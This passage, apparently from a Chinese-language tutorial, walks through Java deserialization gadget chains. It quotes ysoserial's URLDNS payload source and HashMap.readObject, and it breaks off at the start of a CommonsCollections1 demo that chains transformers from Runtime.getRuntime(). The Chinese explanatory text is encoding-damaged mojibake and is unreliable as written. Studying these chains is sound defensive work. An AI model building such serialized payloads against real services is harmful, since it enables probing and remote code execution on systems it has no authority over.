&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">URL&lt;/span> &lt;span style="color:#111">u&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">URL&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">handler&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// URL to use as the Key
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">ht&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">put&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">u&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Reflections&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">setFieldValue&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">u&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;hashCode&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">);&lt;/span> &lt;span style="color:#75715e">// During the put above, the URL&amp;#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">ht&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">PayloadRunner&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">URLDNS&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">/**
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * &amp;lt;p&amp;gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * using the serialized object.&amp;lt;/p&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> *
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * &amp;lt;b&amp;gt;Potential false negative:&amp;lt;/b&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * &amp;lt;p&amp;gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> * second resolution.&amp;lt;/p&amp;gt;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"> */&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">SilentURLStreamHandler&lt;/span> &lt;span style="color:#00a8c8">extends&lt;/span> &lt;span style="color:#111">URLStreamHandler&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">URLConnection&lt;/span> &lt;span style="color:#75af00">openConnection&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">URL&lt;/span> &lt;span style="color:#111">u&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#00a8c8">synchronized&lt;/span> &lt;span style="color:#111">InetAddress&lt;/span> &lt;span style="color:#75af00">getHostAddress&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">URL&lt;/span> &lt;span style="color:#111">u&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#00a8c8">null&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™æ˜¯yoserialä¸­URLDNSéƒ¨åˆ†çš„æºç ï¼Œå¾ˆçŸ­&lt;/p>
&lt;p>æ•´ä¸ªé“¾å­çš„æ”»å‡»åˆ©ç”¨çš„æ˜¯HashMapä¼šè°ƒç”¨keyçš„hashCodeæ–¹æ³•æ¥å®šä½å¯¹åº”çš„valueï¼Œå½“url objectä½œä¸ºkeyæ—¶ä¼šç”±äºŽhashCodeçš„è®¡ç®—è¿›è€Œè§¦å‘DNSè¯·æ±‚ï¼ˆå› ä¸ºè¦è§£æžhostnameæ˜¯å¦æŒ‡å‘åŒä¸€ä¸ªIp&lt;/p>
&lt;h3 id="hashmap">HashMap&lt;/h3>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">ObjectInputStream&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">IOException&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ClassNotFoundException&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">ObjectInputStream&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">GetField&lt;/span> &lt;span style="color:#111">fields&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readFields&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Read loadFactor (ignore threshold)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">float&lt;/span> &lt;span style="color:#111">lf&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">fields&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;loadFactor&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">75f&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">lf&lt;/span> &lt;span style="color:#f92672">&amp;lt;=&lt;/span> &lt;span style="color:#111">0&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#111">Float&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">isNaN&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">lf&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvalidObjectException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Illegal load factor: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">lf&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">lf&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Math&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">min&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Math&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">max&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">25f&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">lf&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#111">4&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">0f&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">HashMap&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">UnsafeHolder&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">putLoadFactor&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">lf&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">reinitialize&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readInt&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// Read and ignore number of buckets
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">mappings&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readInt&lt;/span>&lt;span style="color:#f92672">();&lt;/span> &lt;span style="color:#75715e">// Read number of mappings (size)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">mappings&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">InvalidObjectException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Illegal mappings count: &amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">mappings&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">mappings&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// use defaults
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">else&lt;/span> &lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">mappings&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">float&lt;/span> &lt;span style="color:#111">fc&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">float&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">mappings&lt;/span> &lt;span style="color:#f92672">/&lt;/span> &lt;span style="color:#111">lf&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">1&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">0f&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">cap&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">fc&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">DEFAULT_INITIAL_CAPACITY&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">?&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">DEFAULT_INITIAL_CAPACITY&lt;/span> &lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">fc&lt;/span> &lt;span style="color:#f92672">&amp;gt;=&lt;/span> &lt;span style="color:#111">MAXIMUM_CAPACITY&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">?&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">MAXIMUM_CAPACITY&lt;/span> &lt;span style="color:#f92672">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">tableSizeFor&lt;/span>&lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">fc&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">float&lt;/span> &lt;span style="color:#111">ft&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">float&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">cap&lt;/span> &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#111">lf&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">threshold&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">((&lt;/span>&lt;span style="color:#111">cap&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">MAXIMUM_CAPACITY&lt;/span> &lt;span style="color:#f92672">&amp;amp;&amp;amp;&lt;/span> &lt;span style="color:#111">ft&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">MAXIMUM_CAPACITY&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">?&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#f92672">)&lt;/span>&lt;span style="color:#111">ft&lt;/span> &lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#111">Integer&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">MAX_VALUE&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Check Map.Entry[].class since it&amp;#39;s the nearest public type to
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75715e">// what we&amp;#39;re actually creating.
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">SharedSecrets&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getJavaOISAccess&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">checkArray&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Map&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">Entry&lt;/span>&lt;span style="color:#f92672">[].&lt;/span>&lt;span style="color:#75af00">class&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">cap&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@SuppressWarnings&lt;/span>&lt;span style="color:#f92672">({&lt;/span>&lt;span style="color:#d88200">&amp;#34;rawtypes&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;unchecked&amp;#34;&lt;/span>&lt;span style="color:#f92672">})&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Node&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">V&lt;/span>&lt;span style="color:#f92672">&amp;gt;[]&lt;/span> &lt;span style="color:#111">tab&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Node&lt;/span>&lt;span style="color:#f92672">&amp;lt;&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#f92672">,&lt;/span>&lt;span style="color:#111">V&lt;/span>&lt;span style="color:#f92672">&amp;gt;[])&lt;/span>&lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Node&lt;/span>&lt;span style="color:#f92672">[&lt;/span>&lt;span style="color:#111">cap&lt;/span>&lt;span style="color:#f92672">];&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">table&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">tab&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e">// Read the keys and values, and put the mappings in the HashMap
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#00a8c8">int&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">0&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span> &lt;span style="color:#f92672">&amp;lt;&lt;/span> &lt;span style="color:#111">mappings&lt;/span>&lt;span style="color:#f92672">;&lt;/span> &lt;span style="color:#111">i&lt;/span>&lt;span style="color:#f92672">++)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@SuppressWarnings&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;unchecked&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">K&lt;/span> &lt;span style="color:#111">key&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">K&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">@SuppressWarnings&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;unchecked&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">V&lt;/span> &lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">V&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#111">s&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">readObject&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">putVal&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">hash&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">),&lt;/span> &lt;span style="color:#111">key&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">value&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#00a8c8">false&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">}&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>è¿™æ˜¯å®ƒé‡å†™çš„&lt;code>readObject&lt;/code>æ–¹æ³•ï¼Œåœ¨æœ€åŽä¸€è¡Œå¯¹keyè®¡ç®—hashå€¼ï¼Œä¼šè§¦å‘hashCodeæ–¹æ³•ï¼Œè€Œè®¡ç®—hashCodeæ—¶ä¼šè§¦å‘DNSçš„è¯·æ±‚&lt;/p>
&lt;p>æž„é€ é“¾å­æ—¶æˆ‘ä»¬éœ€è¦åˆå§‹åŒ–ä¸€ä¸ª&lt;code>java.net.URL&lt;/code>å¯¹è±¡ä½œä¸ºHashMapçš„keyï¼Œä¹‹åŽå°†è¿™ä¸ªå¯¹è±¡çš„hashCodeè®¾ä¸º-1ï¼Œå¼ºåˆ¶åœ¨ååºåˆ—åŒ–æ—¶é‡æ–°è®¡ç®—hashCodeï¼Œè§¦å‘åŽç»­è°ƒç”¨&lt;/p>
&lt;p>å¦å¤–åœ¨ysoserialçš„payloadç”Ÿæˆæ—¶ä¸ºäº†é˜²æ­¢æ‰§è¡ŒDNSè¯·æ±‚ï¼Œä½¿ç”¨äº†&lt;code>SilentURLStreamHandler&lt;/code>&lt;/p>
&lt;h2 id="cc18u71">CC1(&amp;lt;8u71&lt;/h2>
&lt;p>åœ¨pç‰›çš„javaå®‰å…¨æ¼«è°ˆä¸­ç»™å‡ºäº†CC1çš„æžç®€ç‰ˆdemo&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-java" data-lang="java">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">testCC1&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">transformers&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Transformer&lt;/span>&lt;span style="color:#f92672">[]{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">ConstantTransformer&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Runtime&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getRuntime&lt;/span>&lt;span style="color:#f92672">()),&lt;/span>
